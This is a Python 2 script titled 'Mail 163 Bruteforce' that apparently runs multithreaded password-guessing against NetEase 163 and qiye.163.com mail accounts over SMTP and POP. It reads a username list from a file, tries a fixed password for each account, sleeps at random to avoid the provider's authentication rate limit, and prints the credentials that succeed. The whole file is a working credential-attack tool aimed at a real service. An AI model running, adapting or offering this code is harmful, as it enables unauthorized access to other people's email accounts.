#!/usr/bin/python2
# -*- coding: utf-8 -*-

# Mail 163 Bruteforce
# Author: Nixawk

# 163 / qiye163
# pop.163.com  / pop.qiye.163.com
# smtp.163.com / smtp.qiye.163.com
# imap.163.com / imap.qiye.163.com


import time
import random
import smtplib
import poplib
import threadpool


def random_sleep():
    time.sleep(random.randint(2, 7))


# /* smtp bruteforce */
def smtplogin(smtpuser, smtppass, smtphost, smtpport=25):
    try:
        code, msg = 0, ''
        smtp = smtplib.SMTP(smtphost, smtpport)
        code, msg = smtp.login(smtpuser, smtppass)
        # (235, 'Authentication successful')
        # (535, 'Error: authentication failed')
        smtp.close()
    except smtplib.SMTPAuthenticationError as err:
        code, msg = err
    except smtplib.SMTPConnectError:
        code, msg = err
        # 554, 'IP is rejected, smtp auth error limit exceed,
        # 163 smtp3,DdGowEAJZUITuH5W56gUAA--.924S0 1451145236')
    finally:
        return (smtpuser, smtppass, (code, msg))


# /* pop bruteforce */
def poplogin(popuser, poppass, pophost, popport=110):
    try:
        pop = poplib.POP3(pophost, popport, timeout=4)
        pop.user(popuser)         # '+OK core mail'
        msg = pop.pass_(poppass)  # '+OK 0 message(s) [0 byte(s)]'
        pop.quit()
    except poplib.error_proto as err:
        msg = err
    except poplib.socket.timeout:
        msg = "pop Login timeout"
    finally:
        return (popuser, poppass, msg)


# /* mail.163.com */
def mail_163(username, password,
             smtpserver='smtp.163.com', popserver='pop.163.com'):
    smtp_login = False
    pop_login = False

    random_sleep()

    # smtp login
    user, pass_, (code, msg) = smtplogin(username, password, smtpserver)
    if code == 235 and "Authentication successful" in msg:
        smtp_login = True
    else:
        print("[-] %s: %s - smtp login - (%s: %s)" % (user, pass_, code, msg))

    # pop login
    user, pass_, msg = poplogin(username, password, popserver)
    if ('+OK' in msg) and ('message' in msg):
        pop_login = True
    else:
        print("[-] %s: %s - pop login  - %s" % (user, pass_, msg))

    if smtp_login and pop_login:
        print("\033[32m[+] %s: %s - Login successfully\033[m" % (user, pass_))

    return smtp_login and pop_login


# /* mail.qiye.163.com */
def qiye_163(username, password):
    return mail_163(username, password,
                    smtpserver='smtp.qiye.163.com',
                    popserver='pop.qiye.163.com')


# /* multi threads to do tasks */
def multi_threads(threadnum, func, args_kwds, callback=None):
    '''
    def callback(request, data):
        if len(data[0]['Address']) > 0:
            logging.info(data)
        pass
        # print "callback: %s: %s" % (request.requestID, data)
    '''

    def exp_callback(request, exc_info):
        pass

    requests = threadpool.makeRequests(func,
                                       args_kwds,
                                       callback,
                                       exp_callback)

    pool = threadpool.ThreadPool(threadnum)

    [pool.putRequest(req) for req in requests]

    while True:
        try:
            pool.poll()
        except KeyboardInterrupt:
            break
        except threadpool.NoResultsPending:
            break

    if pool.dismissedWorkers:
        pool.joinAllDismissedWorkers()


if __name__ == '__main__':
    # mail.163.com
    """
    username = 'test'
    password = 'testpassword'
    mail_163(username, password,
             smtpserver='smtp.163.com', popserver='pop.163.com')

    # mail.qiye.163.com
    username = "test@company.com"
    password = "test@2015"
    mail_163(username, password,
             smtpserver='smtp.qiye.163.com', popserver='pop.qiye.163.com')
    """

    with open("/tmp/users.txt") as wdf:
        args_kwds = [((username.strip(), "password"), {}) for username in wdf]

    multi_threads(10, qiye_163, args_kwds)
